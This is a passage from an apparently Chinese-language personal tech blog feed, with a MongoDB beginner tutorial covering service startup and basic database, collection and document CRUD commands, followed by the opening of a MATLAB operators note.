class="hljs-comment">// @符号后面的 4.4 是最新版本号。</span><br><br>brew services start mongodb-community@<span class="hljs-number">4.2</span> <span class="hljs-comment">//启动</span><br>brew services stop mongodb-community@<span class="hljs-number">4.2</span> <span class="hljs-comment">//停止</span><br><br><span class="hljs-comment">//以下代码非需要 不必运行</span><br>mongod --config /usr/local/etc/mongod.conf --fork <span class="hljs-comment">//mongod 命令后台进程方式：</span><br>&gt; db.adminCommand(&#123; <span class="hljs-string">&quot;shutdown&quot;</span> : <span class="hljs-number">1</span> &#125;) <span class="hljs-comment">// 这种方式启动要关闭可以进入 mongo shell 控制台来实现：</span><br></code></pre></div></td></tr></table></figure><h2 id="01-MongoDB与MySQL"><a href="#01-MongoDB与MySQL" class="headerlink" title="01.MongoDB与MySQL"></a>01.MongoDB与MySQL</h2><p><img src="https://img-blog.csdnimg.cn/2021071908485373.jpg"></p><table><thead><tr><th align="center">MySQL</th><th align="center">MongoDB</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">database</td><td align="center">database</td><td align="center">数据库</td></tr><tr><td align="center">table</td><td align="center">collection</td><td align="center">数据表/集合</td></tr><tr><td align="center">row</td><td align="center">document</td><td align="center">数据记录行/文档</td></tr><tr><td align="center">column</td><td align="center">field</td><td align="center">数据字段/域</td></tr><tr><td align="center">index</td><td align="center">index</td><td align="center">索引</td></tr><tr><td align="center">table joins</td><td align="center">无</td><td align="center">表连接/MondoDB不支持</td></tr><tr><td align="center">无</td><td align="center">嵌入文档</td><td align="center">MongoDB通过嵌入式文档来替代多表连接</td></tr><tr><td align="center">primary key</td><td align="center">primary key</td><td align="center">主键。MongoDB自动将 _id 字段设置为主键</td></tr></tbody></table><h2 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1.基础语法"></a>1.基础语法</h2><h3 id="1-1-创建、切换数据库（use）"><a href="#1-1-创建、切换数据库（use）" class="headerlink" title="1.1 创建、切换数据库（use）"></a>1.1 创建、切换数据库（use）</h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">use name<br><span class="hljs-comment">/*实例*/</span><br>use loong<br></code></pre></div></td></tr></table></figure><ul><li><strong>⚠️注意：</strong> 如果数据库不存在，则创建数据库，否则切换到该数据库。<strong>如果创建了数据库，但没有插入数据，使用 <code>show dbs</code> 命令时，是看不见数据库的。</strong> 在 MongoDB 中，集合只有在内容插入后才会创建! 就是说，创建集合(数据表)后要再插入一个文档(记录)，集合才会真正创建。MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中</li></ul><h3 id="1-2-查看当前数据库（db）"><a href="#1-2-查看当前数据库（db）" class="headerlink" title="1.2 查看当前数据库（db）"></a>1.2 查看当前数据库（db）</h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db<br></code></pre></div></td></tr></table></figure><h3 id="1-3-查看所有数据库（show-dbs）"><a href="#1-3-查看所有数据库（show-dbs）" class="headerlink" title="1.3 查看所有数据库（show dbs）"></a>1.3 查看所有数据库（show dbs）</h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> dbs<br></code></pre></div></td></tr></table></figure><h3 id="1-4-插入数据"><a href="#1-4-插入数据" class="headerlink" title="1.4 插入数据"></a>1.4 插入数据</h3><p>使用IDEA连接MongoDB的，会显示 已被弃用。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">use loong<br>db.loong1.insert(&#123;&quot;name&quot;:&quot;dragonone&quot;&#125;) #在名为loong的数据库中，创建一个名为loong1的集合并插入数据。<br></code></pre></div></td></tr></table></figure><h3 id="1-5-删除数据库"><a href="#1-5-删除数据库" class="headerlink" title="1.5 删除数据库"></a>1.5 删除数据库</h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.dropDatabase()<br></code></pre></div></td></tr></table></figure><ul><li>删除当前数据库，默认为test。</li></ul><h3 id="1-6-创建集合-数据表"><a href="#1-6-创建集合-数据表" class="headerlink" title="1.6 创建集合(数据表)"></a>1.6 创建集合(数据表)</h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.createCollection(name,options)<br></code></pre></div></td></tr></table></figure><ul><li><p><code>name</code>：需要创建的集合名称。</p></li><li><p><code>options</code>：可选参数。指定有关内存大小及索引的选项。包括：<br><code>capped</code>：如果为true，则创建固定集合，且此时必须指定size参数。固定集合是指有着固定大小的集合，当达到最大值时，它会自动覆盖最早的文档。<br><code>size</code>：为固定集合指定一个最大值，即字节数。<br><code>max</code>：指定固定集合中包含文档的最大数量。</p></li></ul><p>在插入文档时，MongoDB 首先检查固定集合的 size 字段，然后检查 max 字段。</p><ul><li>实例</li></ul><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"># 方法一<br>db.createCollection(&quot;test1&quot;,&#123;capped:true ,size:500,max:10&#125;)<br></code></pre></div></td></tr></table></figure><p>也可以不需要创建集合。当插入一些文档时，MongoDB 会自动创建集合。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"># 方法二<br>db.test1.insert(&#123;&quot;name&quot;:&quot;abcdefg&quot;&#125;) # 在名为test1的集合中插入数据。<br></code></pre></div></td></tr></table></figure><h3 id="1-7-删除集合-数据表"><a href="#1-7-删除集合-数据表" class="headerlink" title="1.7 删除集合(数据表)"></a>1.7 删除集合(数据表)</h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.collection.drop() # 成功返回<span class="hljs-literal">true</span>，否则返回<span class="hljs-literal">false</span><br></code></pre></div></td></tr></table></figure><ul><li>实例</li></ul><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">use loong # 创建数据库<br>db.createCollection(&quot;test2&quot;) # 创建集合（数据表）test2<br><span class="hljs-keyword">show</span> tables # 输出集合（数据表） 使用 <span class="hljs-keyword">show</span> collections 更好<br>db.test2.drop() # 删除指定集合（数据表）<br></code></pre></div></td></tr></table></figure><h3 id="1-8-插入文档"><a href="#1-8-插入文档" class="headerlink" title="1.8 插入文档"></a>1.8 插入文档</h3><p>以下代码均在数据库：loong，集合名：tothe 中实现。</p><p><strong>必须先执行文档代码，才能在后面使用文档时不出错。</strong></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">dotest=(&#123; # 文档1<br>   title: <span class="hljs-string">&#x27;测试数据&#x27;</span>,<br>    categoies: <span class="hljs-string">&#x27;sql&#x27;</span>,<br>    <span class="hljs-keyword">by</span>: <span class="hljs-string">&#x27;tothefor&#x27;</span>,<br>    url: <span class="hljs-string">&#x27;tothefor.com&#x27;</span>,<br>    tags: [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>]<br><br>&#125;);<br>testdo=(&#123; # 文档2<br>   title: <span class="hljs-string">&#x27;测试数据2&#x27;</span>,<br>    categoies: <span class="hljs-string">&#x27;sql2&#x27;</span>,<br>    <span class="hljs-keyword">by</span>: <span class="hljs-string">&#x27;tothefor2&#x27;</span>,<br>    url: <span class="hljs-string">&#x27;tothefor.com2&#x27;</span>,<br>    tags: [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>]<br><br>&#125;);<br></code></pre></div></td></tr></table></figure><ul><li><strong>文档的数据结构和JSON基本一样。所有存储在集合中的数据都是BSON格式，BSON是一种类似JSON的二进制形式的存储格式。</strong>  <strong>文档就是一条数据。(自行理解)</strong></li></ul><h4 id="1-8-1-insert-和save"><a href="#1-8-1-insert-和save" class="headerlink" title="1.8.1 insert()和save()"></a>1.8.1 insert()和save()</h4><ul><li>区别：insert()方法:当插入数据时,已经存在的_id的数据,则mongodb会直接报错,并返回对应的_id。save()方法:当插入数据时,它会先去循环一遍集合中的所有数据,判断插入的数据的_id是否存在于集合中,如果不存在则会直接插入一条新的文档,如果存在,则会调用mongodb的update()方法,更新_id对应的数据(相当于覆盖该_id的文档内容)。</li></ul><blockquote><ol><li><code>insert()</code></li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"># 写法一<br>db.tothe.insert(dotest);<br><br># 写法二<br>db.tothe.insert(<br>    &#123;<br>        <span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&#x27;honfei&#x27;</span>,<br>        <span class="hljs-string">&#x27;by&#x27;</span>:<span class="hljs-string">&#x27;zhang&#x27;</span>,<br>        <span class="hljs-string">&#x27;url&#x27;</span>:<span class="hljs-string">&#x27;sssss&#x27;</span>,<br>        <span class="hljs-string">&#x27;tags&#x27;</span>:[<span class="hljs-string">&#x27;as&#x27;</span>,<span class="hljs-string">&#x27;sf&#x27;</span>]<br>    &#125;<br><br>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li><code>save()</code></li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">已废除。<br></code></pre></div></td></tr></table></figure><h4 id="1-8-2-insertOne-和insertMany"><a href="#1-8-2-insertOne-和insertMany" class="headerlink" title="1.8.2 insertOne()和insertMany()"></a>1.8.2 insertOne()和insertMany()</h4><blockquote><ol><li><code>insertOne()</code></li></ol></blockquote><p>向集合插入一个新文档（一条新数据）。</p><ul><li>用法</li></ul><p><strong>可以用 <code>db.tothe.find() </code>查看当前集合中的所有数据。</strong></p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"># 用法一<br>db.tothe.insertOne(<br>    dotest, # 文档名字，必须要加上逗号<br>&#123; # 可以先不用管这个，不要也没有影响<br>writeConcern:<br>&#125;<br><br>);<br><br># 用法二<br>db.tothe.insertOne(<br>    &#123;<br>        &quot;name&quot;:<span class="hljs-string">&#x27;wefew&#x27;</span>,<span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&#x27;fweew&#x27;</span><br>    &#125;, # 逗号不能忘记<br>    <br>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li><code>insertMany()</code></li></ol></blockquote><p>向集合中插入一个或多个文档。</p><ul><li>用法</li></ul><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"># 写法一<br>db.tothe.insertMany(<br>    [dotest,testdo], # 不能忘记逗号，且必须在中括号内<br><br>);<br><br># 写法二<br>db.tothe.insertMany(<br>    [<br>    # 文档<span class="hljs-number">1</span>（数据<span class="hljs-number">1</span>）<br>        &#123;<br>        <span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;peng&#x27;</span>,<span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&#x27;dddd&#x27;</span><br>        &#125;,<br>        # 文档<span class="hljs-number">2</span>（数据<span class="hljs-number">2</span>）<br>        &#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;sdfe&#x27;</span>,<span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&#x27;ding&#x27;</span>,<span class="hljs-string">&#x27;by&#x27;</span>:<span class="hljs-string">&#x27;ffwefe&#x27;</span><br>        &#125;<br>    ], # 逗号不能忘记<br><br>);<br><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>参数说明</strong></p></blockquote><ul><li><p><code>document </code>：要写入的文档。该参数指要插入的一个或多个文档的数据，如果是一个文档，则该参数为一个json数据，若是多个文档，则该参数是多个json数据组成的数组。</p></li><li><p><code>writeConcern</code>：可选参数。写入策略，默认为 1，即要求确认写操作，0 是不要求。该参数指的是该次的插入操作的写入关注程度，其值为一个文档，表现为json数据。</p></li><li><p><code>ordered</code>：可选参数。指定是否按顺序写入，默认 true，按顺序写入。如果值为true，则将数组中文档的进行有序插入，如果一个文档发生错误，mongodb将返回，而无需处理数组中的剩余文档。如果false，执行无序插入，如果错误发生在某个文档中，则继续处理数组中的剩余文档。默认为true。</p></li></ul><ul><li>当向集合中插入文档时，如果没有给文档指定 _id 属性，则mongoDB数据库会默认自动为文档添加_id属性，并且该属性用来作为文档的唯一标识。这个是根据时间戳生成的。也可以直接调用 <code>ObjectId()</code>方法来随机建一个时间戳。</li></ul><ul><li>实际上，db.collection.insertOne()方法和db.collection.insertMany()方法都是对db.collection.insert()方法的拆分。db.collection.insertOne()方法和db.collection.insertMany()方法，语义上更加清晰，会告诉我们传几个文档对象，而db.collection.insert()方法则不明确，可以是一个文档对象，也可以是多个，总的来说，这三个方法本质上没多大区别。</li></ul><h3 id="1-9-删除文档"><a href="#1-9-删除文档" class="headerlink" title="1.9 删除文档"></a>1.9 删除文档</h3><h4 id="1-9-1-remove（已过时）"><a href="#1-9-1-remove（已过时）" class="headerlink" title="1.9.1 remove（已过时）"></a>1.9.1 remove（已过时）</h4><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"># 写法一<br>db.tothe.remove(<br>&#123;&#x27;name&#x27;:&#x27;peng&#x27;&#125;<br>&#123;  # 可选参数<br><br>&#125;<br><br>);<br><br># 写法二<br>db.tothe.remove(&#123;&#x27;name&#x27;:&#x27;peng&#x27;&#125;,1) # 只删除找到的第一条记录可以设置 justOne 为 1<br></code></pre></div></td></tr></table></figure><blockquote><p>参数说明：</p></blockquote><ul><li><p>query :（可选）删除的文档的条件。</p></li><li><p>justOne : （可选）如果设为 true 或 1，则只删除一个文档，如果不设置该参数，或使用默认值 false，则删除所有匹配条件的文档。</p></li><li><p>writeConcern :（可选）抛出异常的级别。</p></li></ul><h4 id="1-9-2-deleteMany-和deleteOne"><a href="#1-9-2-deleteMany-和deleteOne" class="headerlink" title="1.9.2 deleteMany()和deleteOne()"></a>1.9.2 deleteMany()和deleteOne()</h4><blockquote><ol><li>deleteMany()</li></ol></blockquote><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.deleteMany(&#123; status : &quot;A&quot; &#125;) # 删除 status 等于 A 的全部文档<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>deleteOne()</li></ol></blockquote><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.deleteOne( &#123; status: &quot;D&quot; &#125; ) # 删除 status 等于 D 的一个文档<br></code></pre></div></td></tr></table></figure><h3 id="1-10-更新文档"><a href="#1-10-更新文档" class="headerlink" title="1.10 更新文档"></a>1.10 更新文档</h3><h4 id="1-10-1-update-和save"><a href="#1-10-1-update-和save" class="headerlink" title="1.10.1 update()和save()"></a>1.10.1 update()和save()</h4><blockquote><ol><li>update()</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.update(<br>    &#123;&#x27;title&#x27;:&#x27;fweew&#x27;&#125;,<br>    &#123;$set:&#123;&#x27;title&#x27;:&#x27;dingeng&#x27;&#125;&#125;,<br>    &#123; # 参数<br>    upsert:  ,<br>        multi: <span class="hljs-literal">true</span>,<br>    &#125;<br>);<br></code></pre></div></td></tr></table></figure><blockquote><p>参数说明：</p></blockquote><ul><li><p>query : update的查询条件，类似sql update查询内where后面的。</p></li><li><p>update : update的对象和一些更新的操作符（如$,$inc…）等，也可以理解为sql update查询内set后面的</p></li><li><p>upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</p></li><li><p>multi : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。</p></li><li><p>writeConcern :可选，抛出异常的级别。</p></li></ul><blockquote><ol start="2"><li>save()</li></ol></blockquote><p>save() 方法通过传入的文档来替换已有文档，_id 主键存在就更新，不存在就插入。</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">已废除。<br></code></pre></div></td></tr></table></figure><h4 id="1-10-2-updateOne-和updateMany"><a href="#1-10-2-updateOne-和updateMany" class="headerlink" title="1.10.2 updateOne()和updateMany()"></a>1.10.2 updateOne()和updateMany()</h4><blockquote><ol><li>updateOne()</li></ol></blockquote><p>向指定集合更新单个文档。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.updateOne(&#123;&quot;name&quot;:&quot;abc&quot;&#125;,&#123;$set:&#123;&quot;age&quot;:&quot;28&quot;&#125;&#125;)<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>updateMany()</li></ol></blockquote><p>向指定集合更新多个文档。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.updateMany(&#123;&quot;age&quot;:&#123;$gt:&quot;10&quot;&#125;&#125;,&#123;$set:&#123;&quot;status&quot;:&quot;xyz&quot;&#125;&#125;) # $gt 表示大于<br></code></pre></div></td></tr></table></figure><h3 id="1-11-查询文档"><a href="#1-11-查询文档" class="headerlink" title="1.11 查询文档"></a>1.11 查询文档</h3><p>条件语句表。</p><table><thead><tr><th align="center">操作</th><th align="center">格式</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">等于</td><td align="center">{&lt;key&gt;:&lt;value&gt;}</td><td align="center">db.col.find({“by”:”tototo”}).pretty()</td></tr><tr><td align="center">小于</td><td align="center">{&lt;key&gt;:{$lt:&lt;value&gt;}}</td><td align="center">db.col.find({“likes”:{$lt:50}}).pretty()</td></tr><tr><td align="center">小于等于</td><td align="center">{&lt;key&gt;:{$lte:&lt;value&gt;}}</td><td align="center">db.col.find({“likes”:{$lte:50}}).pretty()</td></tr><tr><td align="center">大于</td><td align="center">{&lt;key&gt;:{$gt:&lt;value&gt;}}</td><td align="center">db.col.find({“likes”:{$gt:50}}).pretty()</td></tr><tr><td align="center">大于等于</td><td align="center">{&lt;key&gt;:{$gte:&lt;value&gt;}}</td><td align="center">db.col.find({“likes”:{$gte:50}}).pretty()</td></tr><tr><td align="center">不等于</td><td align="center">{&lt;key&gt;:{$ne:&lt;value&gt;}}</td><td align="center">db.col.find({“likes”:{$ne:50}}).pretty()</td></tr></tbody></table><blockquote><ol><li>find()</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.find(query,projection)<br># query ：可选，使用查询操作符指定查询条件<br># projection ：可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。具体用法见下面补充。<br><br><br># 如果需要以易读的方式来读取数据，可以使用 pretty() 方法。pretty() 方法以格式化的方式来显示所有文档。<br>db.tothe.find().pretty()<br><br># 除了 find() 方法之外，还有一个 findOne() 方法，它只返回# 除了 find() 方法之外，还有一个 findOne() 方法，它只返回所有一个 文 档 。<br></code></pre></div></td></tr></table></figure><blockquote><p>projection参数补充</p></blockquote><ul><li>若不指定，则默认返回所有键，指定有两种模式。</li></ul><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.find(query, &#123;title: 1, by: 1&#125;) # inclusion模式 指定返回的键，不返回其他键<br>db.tothe.find(query, &#123;title: 0, by: 0&#125;) # exclusion模式 指定不返回的键,返回其他键<br><br># _id 键默认返回，需要主动指定 _id:<span class="hljs-number">0</span> 才会隐藏<br></code></pre></div></td></tr></table></figure><p><strong>两种模式不可混用（因为这样的话无法推断其他键是否应返回）。即：db.tothe.find(query, {title: 1, by: 0})  这是错误的。</strong></p><ul><li>只能全1或全0，除了在inclusion模式时可以指定_id为0。db.collection.find(query, {_id:0, title: 1, by: 1})。</li></ul><blockquote><ol start="2"><li>AND 条件</li></ol></blockquote><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.find(&#123;key1:value1, key2:value2&#125;).pretty()<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>OR 条件</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">db.tothe.find(<br>   &#123;<br>      $<span class="hljs-keyword">or</span>: [<br>         &#123;key1: value1&#125;, &#123;key2:value2&#125;<br>      ]<br>   &#125;<br>).pretty()<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>AND 和 OR 联合使用</li></ol></blockquote><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"># 类似 <span class="hljs-keyword">where</span> likes<span class="hljs-operator">&gt;</span><span class="hljs-number">50</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">by</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;abc&#x27;</span> <span class="hljs-keyword">OR</span> title <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;MongoDB&#x27;</span>)<br><br>db.tothe.find(&#123;&quot;likes&quot;: &#123;$gt:50&#125;, $or: [&#123;&quot;by&quot;: &quot;abc&quot;&#125;,&#123;&quot;title&quot;: &quot;MongoDB&quot;&#125;]&#125;).pretty()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>MongoDB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（五）</title>
    <link href="/2021/06/19/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2021/06/19/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-运算符"><a href="#1-运算符" class="headerlink" title="1.运算符"></a>1.运算符</h2><h3 id="1-1-算术运算符"><a href="#1-1-算术运算符" class="headerlink" title="1.1 算术运算符"></a>1.1 算术运算符</h3><p>允许两种不同类型的算术运算：矩阵算术运算、阵列算术运算。<br>矩阵的算术运算与线性代数中的定义相同。矩阵运算符和数组运算符是有区别的。然而，由于加法和减法运算矩阵和阵列是相同的，操作这两种情况下是相同的。</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>+</strong></td><td align="center">加法或一元加号。A + B将A和B。 A和B必须具有相同的尺寸，除非一个人是一个标量。一个标量，可以被添加到任何大小的矩阵。</td></tr><tr><td align="center"><strong>-</strong></td><td align="center">减法或一元减号。A - B，减去B从A和B必须具有相同的大小，除非是一个标量。可以从任意大小的矩阵中减去一个标量。</td></tr><tr><td align="center">*****</td><td align="center">矩阵乘法；是一个更精确的矩阵A和B的线性代数积，矩阵乘法对于非纯量A和B，列一个数必须等于B.标量可以乘以一个任意大小的矩阵的行数。</td></tr><tr><td align="center"><strong>.*</strong></td><td align="center">数组的乘法；A.*B是数组A和B的元素积，A和B必须具有相同的大小，除非A、B中有一个是标量。</td></tr><tr><td align="center"><strong>/</strong></td><td align="center">斜线或矩阵右除法；B/A与B * inv（A）大致相同。更确切地说：  B/A = (A’B’)’</td></tr><tr><td align="center"><strong>./</strong></td><td align="center">矩阵右除法；矩阵A与矩阵B相应元素相除（A、B为同纬度的矩阵）</td></tr><tr><td align="center">**.\**</td><td align="center">反斜杠或矩阵左除；如果A是一个方阵，AB是大致相同的INV（A）* B，除非它是以不同的方式计算。如果A是一个n*n的矩阵，B是一个n组成的列向量，或是由若干这样的列的矩阵，则X = AB 是方程 AX = B ，如果A严重缩小或者几乎为单数，则显示警告消息。</td></tr><tr><td align="center"><strong>.</strong></td><td align="center">数组左除法；A. B是元素B（i，j）/A（i，j）的矩阵。A和B必须具有相同的大小，除非其中一个是标量。</td></tr><tr><td align="center"><strong>^</strong></td><td align="center">矩阵的幂。X^P是X到幂P，如果p是标量；如果p是一个整数，则通过重复平方计算功率。如果整数为负数，X首先反转。对P值的计算，涉及到特征值和特征向量，即如果[ D ] = V，EIG（x），那么X^P = V * D.^P / V。</td></tr><tr><td align="center"><strong>.^</strong></td><td 